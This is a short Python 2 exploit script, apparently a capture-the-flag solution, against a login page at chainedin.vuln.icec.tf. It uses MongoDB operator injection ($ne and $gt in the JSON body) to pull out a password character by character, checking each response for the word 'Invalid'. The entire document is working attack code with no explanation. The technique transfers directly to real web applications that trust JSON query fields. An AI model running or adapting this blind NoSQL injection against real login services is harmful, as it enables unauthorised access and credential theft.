#!/usr/bin/python
 
import requests
 
table=""
url="http://chainedin.vuln.icec.tf/login"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
                   'Accept':'application/json, text/plain, */*',
           'Content-Type':'application/json;charset=utf-8',}
 
for length in range(1,1000):
    for i in range(32,34) + range(48,91) + range(94,254):
        x=chr(int(i))
        temp=table+x
        data='{"user": {"$ne": "agent1568"},"pass": {"$gt": "%s"}}' %temp
 
        r=requests.post(url,data,headers=headers)
        if r.content.find('Invalid')>0:
            table=table+chr(i-1)
            print table
            break